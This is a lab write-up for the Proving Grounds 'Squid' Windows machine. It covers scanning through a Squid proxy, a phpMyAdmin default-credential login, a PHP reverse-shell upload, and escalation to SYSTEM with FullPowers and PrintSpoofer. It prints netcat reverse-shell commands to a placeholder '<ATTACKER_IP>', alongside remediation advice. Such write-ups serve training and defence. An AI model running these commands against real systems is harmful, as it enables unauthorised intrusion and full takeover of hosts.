# Squid — Proving Grounds

| | |
|---|---|
| **Platform** | Proving Grounds (Practice) |
| **Difficulty** | Medium |
| **OS** | Windows |
| **Status** | ✅ Practice machine, no overlap with the OSCP exam pool |
| **Key techniques** | Port discovery through a Squid proxy, phpMyAdmin default creds, stripped-token recovery (FullPowers), `SeImpersonatePrivilege` (PrintSpoofer) |

---

## TL;DR

Squid's only directly visible service is a proxy — the real attack surface
sits *behind* it. Scanning through the proxy for open ports reveals
phpMyAdmin on a hidden port, still on default `root:root` credentials, and
a documented phpMyAdmin-to-webshell technique gets code execution. The
resulting shell runs as `LOCAL SERVICE` with a **stripped token** — no
`SeImpersonatePrivilege` despite that account normally holding it —
requiring **FullPowers** to restore the missing privileges before
PrintSpoofer can finish the job.

---

## Recon & Enumeration

```bash
sudo nmap -p- -sCV <TARGET_IP>
```

Port 3128 served a Squid proxy error page — the box's only externally
obvious purpose. Rather than treating that as a dead end, a proxy-aware port
scanner (`spose`) was used to enumerate ports reachable *through* the
proxy rather than directly, which surfaced additional open ports (3306,
8080) invisible to a direct scan.

---

## Foothold / Initial Access

Configuring the discovered proxy in Burp/FoxyProxy for port 8080 revealed a
**phpMyAdmin** login behind it. `root:root` — the well-known phpMyAdmin
default — worked immediately.

A documented phpMyAdmin-to-shell technique (writing a PHP payload through
the `/uploader` component reachable from an authenticated session) allowed
uploading a PHP reverse shell (Ivan Sincek's) directly:

```bash
nc -lvnp 4444
```

Triggering the uploaded shell returned a connection as
`NT AUTHORITY\LOCAL SERVICE`. User flag retrieved.

---

## Privilege Escalation

`whoami /priv`/`whoami /all` showed the account was `LOCAL SERVICE` but with
a **stripped token** — missing `SeImpersonatePrivilege` entirely, despite
that privilege normally being part of LOCAL SERVICE's default set. With no
impersonation privilege, PrintSpoofer/Potato-family tools don't apply
directly.

**FullPowers** (itm4n) exists for exactly this situation: LOCAL
SERVICE/NETWORK SERVICE accounts are *entitled* to their full default
privilege set by design, and FullPowers restores it by spawning a new
process (via a scheduled task) with the complete set intact — it does not
elevate the *current* shell, only a process it spawns:

```
FullPowers.exe -c "cmd /c whoami /priv"
```

Confirming `SeImpersonatePrivilege` was back, the next shell was launched
through FullPowers directly rather than nesting commands (nested quoting
between FullPowers and PrintSpoofer's own `-c` arguments broke on `cmd.exe`'s
literal quote handling — splitting into two separate stages avoided it):

```
# Stage 1 — FullPowers spawns a shell that has SeImpersonate:
FullPowers.exe -c "C:\Temp\nc64.exe <ATTACKER_IP> 443 -e cmd.exe"

# Stage 2 — from that new shell, run PrintSpoofer:
PrintSpoofer64.exe -c "C:\Temp\nc64.exe <ATTACKER_IP> 4444 -e cmd.exe"
```

SYSTEM shell caught on the second listener. Root flag retrieved.

---

## Lessons Learned

- **A proxy in front of a target is itself part of the attack surface** —
  port-scanning *through* it (with a proxy-aware scanner, or by
  configuring it as a pivot in Burp) can reveal services a direct scan
  never sees.
- **A service account missing a privilege it should have by default is a
  "stripped token," not a dead end** — `FullPowers` restores LOCAL
  SERVICE/NETWORK SERVICE's entitled default privileges (`SeImpersonate`,
  `SeAssignPrimaryToken`) for a spawned process.
- **Nested `-c "... -c '...'"` command chaining breaks on `cmd.exe`'s
  literal quote handling** — splitting a multi-tool chain into separate
  reverse-shell stages avoids the quoting problem entirely.

---

## Remediation

- Change all default database/admin panel credentials (`root:root` on
  phpMyAdmin is a critical, trivially avoidable finding).
- Restrict which ports/services a proxy is permitted to reach, and audit
  what an outbound proxy exposes to a client that shouldn't have direct
  network access to those hosts.
- If a service account's privileges have been deliberately stripped as a
  hardening measure, verify the mitigation actually holds against
  privilege-recovery tools like FullPowers rather than assuming the
  stripped state is permanent.

---

**Machine:** [Proving Grounds — Squid](https://portal.offsec.com/labs/play)
